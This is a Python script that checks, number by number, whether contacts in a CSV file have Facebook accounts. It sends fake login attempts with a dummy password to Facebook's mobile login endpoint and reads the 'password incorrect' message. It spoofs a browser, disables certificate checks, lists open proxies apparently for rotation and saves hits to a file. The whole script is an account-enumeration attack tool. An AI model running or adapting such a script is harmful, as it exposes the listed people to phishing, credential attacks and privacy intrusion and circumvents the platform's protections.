import requests
import json
import re
import csv
import time
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

https_proxy = ["https://88.147.142.25:8080", "https://80.211.178.125:8080",
               "https://179.219.96.199:8080", "https://94.130.14.146:31288",
               "https://181.210.20.37:8080", "https://182.48.84.178:8080"
               "https://41.190.33.162:8080", "https://159.89.192.39:3128",
               "https://177.67.83.134:3128", "https://185.93.3.123:8080"];
index = 0;
def userExists(identity):
    global index;
    try:
        headers = {};
        headers["accept-language"] = "en-GB,en-US;q=0.9,en;q=0.8"
        headers["content-type"] = "application/x-www-form-urlencoded"    
        headers["user-agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"

        formdata = {"email" : identity, "pass" : "dsaasdsa", "prefill_contact_point" : identity}
        url = "https://m.facebook.com/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2F&lwv=100";
        proxy = https_proxy[index%9];
        #print(formdata);
        htmlResponse =  requests.post(url, data = formdata, headers = headers, verify=False);

        exp = re.match(r'(?is).*(m_login_notice.*The password you entered is incorrect)' , str(htmlResponse.content));
    except Exception as ex:
        print(ex);
        return None;
    if exp :
        return True;
    else :
        return False;

def saveToFile(data):
    with open('fbUserInfo3.csv', 'a') as csvfile:
        fieldnames =['user', 'exists'];
        writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
        writer.writeheader()
        for entries in data:
            writer.writerow(entries)

print("START");
#userExists();

#with open('fbUserInfo.csv', 'a') as csvfile:
#    fieldnames = ['user', 'exists'];
#    writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
#    writer.writeheader()
    
finalData = [];
print(time.time());
with open('Nishant_Mobile3.csv', 'r') as csvfile:
    textReader = csv.reader(csvfile, delimiter=' ', quotechar='|')
    for row in textReader:
        exists = userExists(row[0]);
        
        index = index + 1;
        print(index);
        print(row[0]);
        print(exists);
        userInfo = {};
        userInfo["user"] = row[0];
        if exists == None:
            continue;

        userInfo['exists'] = exists;
        finalData.append(userInfo);

        print("\n **********");
        if len(finalData) >= 100 :
            print(time.time());
            print("\n************************* Going to write in csv file **************")
            print(finalData);
            saveToFile(finalData);
            finalData = [];
